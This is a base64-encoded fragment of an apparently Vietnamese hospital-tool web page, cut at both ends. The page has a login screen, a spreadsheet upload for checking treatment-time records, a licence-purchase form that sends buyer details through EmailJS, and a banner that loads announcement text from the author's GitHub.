NCiAgPG9wdGlvbj5QdWJsaWMgQmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+U2hpbmhhbiBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5Xb29yaSBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5VT0IgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlN0YW5kYXJkIENoYXJ0ZXJlZCBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5Ib25nIExlb25nIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPkhTQkMgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPkNJTUIgQmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+Q2l0aWJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPkFOWiBWaWV0bmFtPC9vcHRpb24+DQo8L3NlbGVjdD48YnIvPg0KDQo8bGFiZWw+VMOqbiB0w6BpIGtob+G6o24gbmfGsOG7nWkgbXVhOjwvbGFiZWw+DQo8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImJ1eWVyTmFtZSIgcmVxdWlyZWQ+PGJyLz4NCiAgICAgIDxsYWJlbD5Uw6puIGLhu4duaCB2aeG7h24gLyBwaMOybmcga2jDoW06PC9sYWJlbD4NCiAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iaG9zcGl0YWwiIHJlcXVpcmVkPjxici8+DQogICAgICA8bGFiZWw+R21haWwgY8OhIG5ow6JuIGhv4bq3YyDEkcahbiB24buLPC9sYWJlbD4NCiAgICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgaWQ9ImJ1eWVyTWFpbCIgcmVxdWlyZWQ+PGJyLz4NCiAgICAgIDxsYWJlbD5T4buRIMSRaeG7h24gdGhv4bqhaTo8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJidXllclBob25lIiByZXF1aXJlZD48YnIvPjxici8+DQogICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1eS1idG4iPkfhu61pPC9idXR0b24+DQogICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNsb3NlLWJ0biIgb25jbGljaz0iY2xvc2VQYXltZW50KCkiPkjhu6d5PC9idXR0b24+DQogICAgPC9mb3JtPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQo8IS0tIFBPUFVQIFjDgUMgTkjhuqxOIEfhu6xJIC0tPg0KPGRpdiBpZD0iY29uZmlybVBvcHVwIiBjbGFzcz0icG9wdXAtb3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPg0KICA8ZGl2IGNsYXNzPSJwb3B1cC1jb250ZW50IGNvbmZpcm0tcG9wdXAiPg0KICAgIDxoMz7inIUgxJDDoyBn4butaSB04bubaSBi4buZIHBo4bqtbiB0aeG6v3Agbmjhuq1uLjwvaDM+DQogICAgPHA+VnVpIGzDsm5nIMSR4bujaSBr4bq/dCBxdeG6oyB4w6FjIG5o4bqtbiB04burIGLhu5kgcGjhuq1uIGvhu7kgdGh14bqtdC48L3A+DQogICAgPGJ1dHRvbiBjbGFzcz0iY2xvc2UtYnRuIiBvbmNsaWNrPSJjbG9zZUNvbmZpcm0oKSI+xJDDs25nPC9idXR0b24+DQogIDwvZGl2Pg0KPC9kaXY+DQo8L2JvZHk+DQo8c3R5bGU+DQouZm9ybS1wb3B1cCB7DQogIG1heC1oZWlnaHQ6IDgwdmg7ICAgICAgICAgICAvKiBjaGnhur9tIHThu5FpIMSRYSA4MCUgY2hp4buBdSBjYW8gbcOgbiBow6xuaCAqLw0KICBvdmVyZmxvdy15OiBhdXRvOyAgICAgICAgICAgLyogbuG6v3UgbuG7mWkgZHVuZyBkw6BpIHRow6wgY3Xhu5luICovDQogIHBhZGRpbmctcmlnaHQ6IDE1cHg7ICAgICAgICAvKiB0csOhbmggY+G6r3QgY2jhu68ga2hpIGN14buZbiAqLw0KICBzY3JvbGxiYXItd2lkdGg6IHRoaW47ICAgICAgLyogdGhhbmggY3Xhu5luIG3huqNuaCAqLw0KICBzY3JvbGxiYXItY29sb3I6IGdvbGQgdHJhbnNwYXJlbnQ7DQp9DQoNCi8qIGzDoG0gxJHhurlwIHRoYW5oIGN14buZbiB0csOqbiBDaHJvbWUsIEVkZ2UsIFNhZmFyaSAqLw0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyIHsNCiAgd2lkdGg6IDZweDsNCn0NCi5mb3JtLXBvcHVwOjotd2Via2l0LXNjcm9sbGJhci10aHVtYiB7DQogIGJhY2tncm91bmQtY29sb3I6IGdvbGQ7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCn0NCi5mb3JtLXBvcHVwOjotd2Via2l0LXNjcm9sbGJhci10cmFjayB7DQogIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50Ow0KfQ0KLnBvcHVwLW92ZXJsYXkgew0KICBwb3NpdGlvbjogZml4ZWQ7DQogIGluc2V0OiAwOw0KICBiYWNrZ3JvdW5kOiByZ2JhKDAsMCwwLDAuNik7DQogIGRpc3BsYXk6IGZsZXg7DQogIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICB6LWluZGV4OiA5OTk5Ow0KICBhbmltYXRpb246IGZhZGVJbiAwLjNzIGVhc2U7DQp9DQoNCi5wb3B1cC1jb250ZW50IHsNCiAgYmFja2dyb3VuZDogI2ZmZjsNCiAgYm9yZGVyLXJhZGl1czogMjBweDsNCiAgcGFkZGluZzogMzBweDsNCiAgdGV4dC1hbGlnbjogY2VudGVyOw0KICBmb250LWZhbWlseTogJ0ludGVyJywgc2Fucy1zZXJpZjsNCiAgYm94LXNoYWRvdzogMCAwIDI1cHggcmdiYSgwLDAsMCwwLjMpOw0KICBhbmltYXRpb246IHpvb21JbiAwLjNzIGVhc2U7DQp9DQoucG9wdXAtY29udGVudCB7DQogIG1heC13aWR0aDogNzAwcHg7DQogIHdpZHRoOiA5MCU7DQogIGJveC1zaXppbmc6IGJvcmRlci1ib3g7DQp9DQoNCi5sdXh1cnkgew0KICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTQ1ZGVnLCAjMTExLCAjMjIyKTsNCiAgY29sb3I6ICNmZmY7DQogIG1heC13aWR0aDogODAwcHg7DQp9DQoNCi5wb3B1cC10aXRsZSB7DQogIGZvbnQtc2l6ZTogMjRweDsNCiAgbWFyZ2luLWJvdHRvbTogMjBweDsNCiAgY29sb3I6IGdvbGQ7DQogIHRleHQtc2hhZG93OiAwIDAgMTBweCBnb2xkOw0KfQ0KDQoucHJpY2luZy1ncmlkIHsNCiAgZGlzcGxheTogZmxleDsNCiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogIGFsaWduLWl0ZW1zOiBzdHJldGNoOw0KICBnYXA6IDI1cHg7DQogIGZsZXgtd3JhcDogd3JhcDsgLyogxJHhu4MgcmVzcG9uc2l2ZSBraGkgbcOgbiBow6xuaCBuaOG7jyAqLw0KICBtYXJnaW4tdG9wOiAyMHB4Ow0KfQ0KDQoucHJpY2UtY2FyZCB7DQogIGZsZXg6IDEgMSAxODBweDsNCiAgbWF4LXdpZHRoOiAyMDBweDsNCiAgYmFja2dyb3VuZDogcmdiYSgyNTUsMjU1LDI1NSwwLjA4KTsNCiAgYm9yZGVyOiAycHggc29saWQgZ29sZDsNCiAgYm9yZGVyLXJhZGl1czogMThweDsNCiAgcGFkZGluZzogMjBweCAxNXB4Ow0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQoNCi5wcmljZS1jYXJkOmhvdmVyIHsNCiAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xMHB4KSBzY2FsZSgxLjA1KTsNCiAgYm94LXNoYWRvdzogMCAwIDI1cHggZ29sZDsNCn0NCg0KLnByaWNlLWNhcmQgaDMgew0KICBmb250LXNpemU6IDIwcHg7DQogIGNvbG9yOiAjZmZmOw0KICBtYXJnaW4tYm90dG9tOiAxMHB4Ow0KICB0ZXh0LXNoYWRvdzogMCAwIDVweCBnb2xkOw0KfQ0KDQoucHJpY2UtY2FyZCAucHJpY2Ugew0KICBmb250LXNpemU6IDE4cHg7DQogIGNvbG9yOiAjZmZlYjNiOw0KICBmb250LXdlaWdodDogYm9sZDsNCiAgbWFyZ2luLWJvdHRvbTogMTVweDsNCn0NCg0KDQoucHJpY2Ugew0KICBmb250LXNpemU6IDIwcHg7DQogIGNvbG9yOiAjZmZlYjNiOw0KfQ0KDQouYnV5LWJ0biB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgZ29sZCwgI2YzOWMxMik7DQogIGNvbG9yOiAjMDAwOw0KICBib3JkZXI6IG5vbmU7DQogIGJvcmRlci1yYWRpdXM6IDEycHg7DQogIHBhZGRpbmc6IDEwcHggMjBweDsNCiAgY3Vyc29yOiBwb2ludGVyOw0KICBmb250LXdlaWdodDogYm9sZDsNCiAgdHJhbnNpdGlvbjogMC4zczsNCn0NCg0KLmJ1eS1idG46aG92ZXIgew0KICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsICNmZmQ3MDAsICNmZmE1MDApOw0KfQ0KDQouY2xvc2UtYnRuIHsNCiAgbWFyZ2luLXRvcDogMjBweDsNCiAgYmFja2dyb3VuZDogI2U3NGMzYzsNCiAgY29sb3I6ICNmZmY7DQogIGJvcmRlcjogbm9uZTsNCiAgYm9yZGVyLXJhZGl1czogMTBweDsNCiAgcGFkZGluZzogMTBweCAyMHB4Ow0KICBjdXJzb3I6IHBvaW50ZXI7DQp9DQoNCkBrZXlmcmFtZXMgZmFkZUluIHsNCiAgZnJvbSB7IG9wYWNpdHk6IDA7IH0gdG8geyBvcGFjaXR5OiAxOyB9DQp9DQoNCkBrZXlmcmFtZXMgem9vbUluIHsNCiAgZnJvbSB7IHRyYW5zZm9ybTogc2NhbGUoMC45KTsgb3BhY2l0eTogMDsgfSB0byB7IHRyYW5zZm9ybTogc2NhbGUoMSk7IG9wYWNpdHk6IDE7IH0NCn0NCg0KLmZvcm0tcG9wdXAgaW5wdXQgew0KICB3aWR0aDogOTAlOw0KICBtYXJnaW46IDVweCAwOw0KICBwYWRkaW5nOiA4cHg7DQogIGJvcmRlcjogMXB4IHNvbGlkICNhYWE7DQogIGJvcmRlci1yYWRpdXM6IDhweDsNCn0NCg0KLmNvbmZpcm0tcG9wdXAgew0KICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTQ1ZGVnLCAjNENBRjUwLCAjMkU3RDMyKTsNCiAgY29sb3I6ICNmZmY7DQogIHBhZGRpbmc6IDI1cHggNDBweDsNCiAgYm9yZGVyLXJhZGl1czogMjBweDsNCn0uZm9ybS1wb3B1cCBzZWxlY3Qgew0KICB3aWR0aDogOTAlOw0KICBtYXJnaW46IDVweCAwOw0KICBwYWRkaW5nOiA4cHg7DQogIGJvcmRlcjogMXB4IHNvbGlkICNhYWE7DQogIGJvcmRlci1yYWRpdXM6IDhweDsNCiAgYmFja2dyb3VuZDogI2ZmZjsNCn0NCjwvc3R5bGU+PHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCAoKSA9PiB7DQogIGNvbnN0IGJ1eUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXkiKTsNCiAgaWYgKGJ1eUJ0bikgew0KICAgIGJ1eUJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogICAgfSk7DQogIH0NCn0pOw0KDQpmdW5jdGlvbiBjbG9zZUJ1eVBvcHVwKCkgew0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KfQ0KDQpmdW5jdGlvbiBvcGVuUGF5bWVudChwZXJpb2QsIHByaWNlKSB7DQogIGNsb3NlQnV5UG9wdXAoKTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBheW1lbnRQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtb25leSIpLnZhbHVlID0gYCR7cHJpY2V9ICgke3BlcmlvZH0pYDsNCn0NCg0KZnVuY3Rpb24gY2xvc2VQYXltZW50KCkgew0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudFBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCn0NCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBheW1lbnRGb3JtIikuYWRkRXZlbnRMaXN0ZW5lcigic3VibWl0IiwgYXN5bmMgKGUpID0+IHsNCiAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICBjb25zdCBmb3JtRGF0YSA9IHsNCiAgICBhY2M6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXllckFjYyIpLnZhbHVlLA0KCSAgYmFuazogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyQmFuayIpLnZhbHVlLA0KICAgIG5hbWU6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXllck5hbWUiKS52YWx1ZSwNCiAgICBob3NwaXRhbDogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhvc3BpdGFsIikudmFsdWUsDQogICAgbWFpbDogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyTWFpbCIpLnZhbHVlLA0KICAgIHBob25lOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJQaG9uZSIpLnZhbHVlLA0KICAgIG1vbmV5OiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibW9uZXkiKS52YWx1ZQ0KICB9Ow0KDQogIHRyeSB7DQplbWFpbGpzLnNlbmQoInNlcnZpY2VfcGdvYmtxNyIsICJ0ZW1wbGF0ZV9tNHVlODVjIiwgZm9ybURhdGEpDQogIC50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKSB7DQogICAgY29uc29sZS5sb2coIkfhu61pIHRow6BuaCBjw7RuZzoiLCByZXNwb25zZS5zdGF0dXMsIHJlc3BvbnNlLnRleHQpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb25maXJtUG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICB9LCBmdW5jdGlvbihlcnJvcikgew0KICAgIGNvbnNvbGUuZXJyb3IoIkzhu5dpIEVtYWlsSlM6IiwgZXJyb3IpOw0KICB9KTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudFBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29uZmlybVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgfSBjYXRjaCB7DQogIH0NCn0pOw0KDQpmdW5jdGlvbiBjbG9zZUNvbmZpcm0oKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb25maXJtUG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KfQ0KPC9zY3JpcHQ+DQoNCg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxkaXYgY2xhc3M9ImxvZ2luLXNlY3Rpb24iIGlkPSJsb2dpblNlY3Rpb24iPg0KPGgyIGNsYXNzPSJsb2dpbi10aXRsZSI+xJDEgk5HIE5I4bqsUCBI4buGIFRI4buQTkc8L2gyPg0KPGlucHV0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9InVzZXJuYW1lSW5wdXQiIHBsYWNlaG9sZGVyPSJUw6puIMSRxINuZyBuaOG6rXAiIHR5cGU9InRleHQiLz4NCjxpbnB1dCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJwYXNzd29yZElucHV0IiBwbGFjZWhvbGRlcj0iTeG6rXQga2jhuql1IiB0eXBlPSJwYXNzd29yZCIvPg0KPGJyLz48YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJsb2dpbkJ0biI+xJDEg25nIG5o4bqtcDwvYnV0dG9uPg0KPGRpdiBjbGFzcz0ibG9naW4tZXJyb3IiIGlkPSJsb2dpbkVycm9yIj5Uw6puIMSRxINuZyBuaOG6rXAgaG/hurdjIG3huq10IGto4bqpdSBraMO0bmcgxJHDum5nPC9kaXY+DQo8YnIvPjxici8+PGhyLz48YnIvPjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImJ1eSI+TXVhIFTDoGkgS2hv4bqjbiAtIEvDrWNoIEhv4bqhdCBC4bqjbiBRdXnhu4FuPC9idXR0b24+DQoNCjwvZGl2Pg0KPGRpdiBjbGFzcz0ibWFpbi1jb250ZW50IiBpZD0ibWFpbkNvbnRlbnQiPg0KPGRpdiBjbGFzcz0idG9wLWJ1dHRvbi1ncm91cCI+PGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYnV5Ij5NdWEgQuG6o24gUXV54buBbjwvYnV0dG9uPg0KICA8YnV0dG9uIG9uY2xpY2s9Im9wZW5DdXN0b21pemVQYW5lbCgpIiBjbGFzcz0iYnRuIj5UdeG7syBiaeG6v248L2J1dHRvbj4NCg0KDQoNCjxidXR0b24gb25jbGljaz0ic2hvd0Ryb3Bib3hQYW5lbCgpIiBjbGFzcz0iYnRuIj5QYW5lbDwvYnV0dG9uPg0KDQogIDxidXR0b24gb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOyIgY2xhc3M9ImJ0biI+WG/DoSBDYWNoZTwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iaWQ9ImxvZ291dEJ0biI+xJDEg25nIHh14bqldDwvYnV0dG9uPg0KPC9kaXY+DQoNCg0KPGgxPiA8YSBocmVmPSJodHRwczovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiBzdHlsZT0iYWxsOiB1bnNldDsgY3Vyc29yOiBwb2ludGVyOyIgdGFyZ2V0PSJfYmxhbmsiPktp4buDbSBUcmEgVGjhu6cgVGh14bqtdDwvYT48L2gxPg0KPGRpdiBjbGFzcz0ibGlzdDEiIHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBnYXA6IDhweDsiPg0KPGkgY2xhc3M9ImZhIGZhLWJ1bGxob3JuIj48L2k+DQo8Yj48Zm9udCBjb2xvcj0icmVkIj5UaMO0bmcgYsOhbzo8L2ZvbnQ+PC9iPg0KPGRpdiBjbGFzcz0ic2Nyb2xsaW5nLXRleHQiIHN0eWxlPSJmbGV4OiAxOyBvdmVyZmxvdzogaGlkZGVuOyI+DQo8ZGl2IGNsYXNzPSJzY3JvbGxpbmctY29udGVudCIgaWQ9Im5vaWR1bmciPg0KDQo8L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KDQoNCmZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vdGhvbmdiYW8udHh0JykNCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQ0KICAudGhlbihkYXRhID0+IHsNCiAgICBjb25zdCBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lkdW5nJyk7DQogICAgZWwuaW5uZXJIVE1MID0gZGF0YTsNCg0KICAgIC8vIFTEg25nIMSR4buZIGTDoGkgbuG7mWkgZHVuZyDEkeG7gyDEkeG6o20gYuG6o28gY3Xhu5luDQogICAgZWwuc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgIGVsLnN0eWxlLm1pbldpZHRoID0gJzEwMCUnOw0KDQogICAgLy8gUmVzZXQgYW5pbWF0aW9uIHRvIGZvcmNlIHJlZmxvdw0KICAgIGVsLnN0eWxlLmFuaW1hdGlvbiA9ICdub25lJzsNCiAgICB2b2lkIGVsLm9mZnNldFdpZHRoOw0KICAgIGVsLnN0eWxlLmFuaW1hdGlvbiA9ICdzY3JvbGwtbGVmdCAxMHMgbGluZWFyIGluZmluaXRlJzsNCiAgfSkNCiAgLmNhdGNoKGVycm9yID0+IHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbm9pZHVuZycpLnRleHRDb250ZW50ID0gJ0tow7RuZyB0aOG7gyB04bqjaSBu4buZaSBkdW5nLic7DQogICAgY29uc29sZS5lcnJvcihlcnJvcik7DQogIH0pOw0KDQoNCjwvc2NyaXB0Pg0KPGRpdiBjbGFzcz0idXBsb2FkLXNlY3Rpb24iPjxkaXYgY2xhc3M9Im1haW5ibG9rIj4NCg0KPGlucHV0IGFjY2VwdD0iLnhsc3gsIC54bHMsIC5jc3YiIGlkPSJmaWxlSW5wdXQiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIHR5cGU9ImZpbGUiLz4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9InRyaWdnZXJCdXR0b24iPjxpIGNsYXNzPSJmYXMgZmEtZmlsZS11cGxvYWQiPjwvaT4gQ2jhu41uIGZpbGUgdGjhu6cgY8O0bmc8L2J1dHRvbj4NCjxici8+PGJyLz4NCjxpbnB1dCBkaXJlY3Rvcnk9IiIgaWQ9ImZvbGRlcklucHV0IiBtdWx0aXBsZT0iIiBzdHlsZT0iZGlzcGxheTpub25lIiB0eXBlPSJmaWxlIiB3ZWJraXRkaXJlY3Rvcnk9IiIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iZm9sZGVyQnRuIj48aSBjbGFzcz0iZmFzIGZhLWZvbGRlci1vcGVuIj48L2k+IENo4buNbiB0aMawIG3hu6VjIChU4buxIMSR4buZbmcgdMOsbSBmaWxlKTwvYnV0dG9uPg0KPGRpdiBpZD0ic2NhblN0YXR1cyIgc3R5bGU9Im1hcmdpbi10b3A6MTBweDtjb2xvcjojMzQ5OGRiO2ZvbnQtd2VpZ2h0OmJvbGQiPjwvZGl2Pg0KDQoNCjxsYWJlbD4NCjxpbnB1dCBuYW1lPSJ0aW1lT3B0aW9uIiB0eXBlPSJyYWRpbyIgdmFsdWU9Ijc6MDAiLz4gDQogICAgICAgICAgICAgICAgICAgICAgICBH4bujaSDDvSB04burIDA3OjAwDQogICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+DQo8bGFiZWw+DQo8aW5wdXQgY2hlY2tlZD0iIiBuYW1lPSJ0aW1lT3B0aW9uIiB0eXBlPSJyYWRpbyIgdmFsdWU9Ijc6MzAiLz4gDQogICAgICAgICAgICAgICAgICAgICAgICBH4bujaSDDvSB04burIDA3OjMwDQogICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+DQo8YnIvPjxici8+DQoNCiAgPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBjaGVja2VkPSIxIiBpZD0iaWdub3JlQWRqYWNlbnRDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4NCjxzcGFuIGNsYXNzPSJjaHUtdGhpY2giPkLhu48gcXVhIHRo4bunIHRodeG6rXQgbGnhu4FuIGvhu4E8c3BhbiBjbGFzcz0ibm9pLWR1bmciPlZEOiA4aDAwLThoMzAgeG9hIGLDs3AuIDA4aDMwLTA4aDUwIMSRaeG7h24gY2jDom0uIGxpw6puIHRp4bq/cCBtw6Aga28gY8OhY2ggMSBwaMO6dCA8L3NwYW4+PC9zcGFuPg0KPC9sYWJlbD4NCg0KICA8bGFiZWwgc3R5bGU9Im1hcmdpbi1yaWdodDogMTBweDsiPg0KPGlucHV0IGlkPSJzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3giIHR5cGU9ImNoZWNrYm94Ii8+IA0KICAgICAgICBIaeG7g24gdGjhu4sgNiBraHVuZyBnaeG7nSBn4bujaSDDvSAgICAgICAgIA0KICAgIDwvbGFiZWw+DQoNCjxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgaWQ9InNob3dEb2N0b3JDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oDQogICAgPC9sYWJlbD48bGFiZWw+DQogIDxpbnB1dCBpZD0ic2hvd0hlcmJFcnJvckRheXNDaGVja2JveCIgdHlwZT0iY2hlY2tib3giY2hlY2tlZC8+DQogIENo4buJIGhp4buDbiB0aOG7iyBuZ8OgeSBz4bqvYyB0aHXhu5FjIGzhu5dpDQo8L2xhYmVsPg0KPGJyLz48YnIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYW5hbHl6ZUJ0biI+S2nhu4NtIFRyYTwvYnV0dG9uPg0KDQoNCg0KDQoNCg0KDQoNCg0KPHNjcmlwdD4NCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3QgZmlsZSA9IHRoaXMuZmlsZXNbMF07DQogICAgaWYgKGZpbGUpIHsNCiAgICAgICAgY29uc3Qgc3RhdHVzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKTsNCiAgICAgICAgc3RhdHVzLmlubmVySFRNTCA9IGA8aSBjbGFzcz0iZmFzIGZhLWZpbGUiPjwvaT7EkMOjIGNo4buNbiBmaWxlOiA8Yj4ke2ZpbGUubmFtZX08L2I+YDsNCiAgICAgICAgc3RhdHVzLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBzdGF0dXMuc3R5bGUuY29sb3IgPSAnIzJjM2U1MCc7DQogICAgfQ0KfSk7DQoNCjwvc2NyaXB0Pg0KPGRpdiBpZD0ic2NhblN0YXR1cyIgc3R5bGU9Im1hcmdpbi10b3A6MTBweDsgY29sb3I6IzJjM2U1MDsgZm9udC13ZWlnaHQ6Ym9sZDsgZGlzcGxheTogbm9uZTsiPjwvZGl2Pg0KPGJyLz4NCjxzcGFuIHN0eWxlPSJmb250LXNpemU6IDEycHg7Ij48aT5QaOG6p24gbeG7gW0gxJHDtGkga2hpIGPDsyB0aOG7gyBt4bqvYyBs4buXaS4gWGluIGjDo3kga2nhu4NtIHRyYSBjw6FjIHRow7RuZyB0aW4gcXVhbiB0cuG7jW5nLjwvaT48L3NwYW4+DQo8ZGl2IGlkPSJmaWxlUmVxdWlyZW1lbnRzIj48L2Rpdj4NCjwvZGl2PjwvZGl2Pg0KDQoNCjwhLS0gQuG6rlQgxJDhuqZVOiBC4bqiTkcgR0nhu5wgVFLhu5BORyBU4buqTkcgTkfGr+G7nEkgLS0+DQogIDxidXR0b24gaWQ9ImhlcmJUb2dnbGVCdG4iIGNsYXNzPSJidG4iIG9uY2xpY2s9InRvZ2dsZUhlcmJMaXN0KCkic3R5bGU9ImRpc3BsYXk6bm9uZSI+U+G6r2MgdGh14buRYyB0aGFuZzwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9InRvZ2dsZUF2YWlsYWJpbGl0eSgpIiBzdHlsZT0iZGlzcGxheTpub25lIj5HaeG7nSB0cuG7kW5nPC9idXR0b24+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJwYXRpZW50TGlzdEJ0biIgb25jbGljaz0ib3BlblBhdGllbnRMaXN0KCkiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPkRhbmggc8OhY2ggYuG7h25oIG5ow6JuPC9idXR0b24+DQo8ZGl2IGlkPSJhdmFpbGFiaWxpdHlUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi1ib3R0b206IDIwcHg7Ij4NCiA8ZGl2IGNsYXNzPSJtYWluYmxvayIgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7IGRpc3BsYXk6bm9uZTsiIGlkPSJhdmFpbGFiaWxpdHlGaWx0ZXJCbG9jayI+DQogIDxsYWJlbCBmb3I9ImZpbHRlck9wZXJhdG9yIj5OZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQogIDxzZWxlY3QgaWQ9ImZpbHRlck9wZXJhdG9yIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvO21hcmdpbi1yaWdodDoyMHB4OyI+PC9zZWxlY3Q+DQoNCiAgPGxhYmVsIGZvcj0iZmlsdGVyRGF0ZSI+TmfDoHk6PC9sYWJlbD4NCiAgPHNlbGVjdCBpZD0iZmlsdGVyRGF0ZSIgY2xhc3M9ImxvZ2luLWl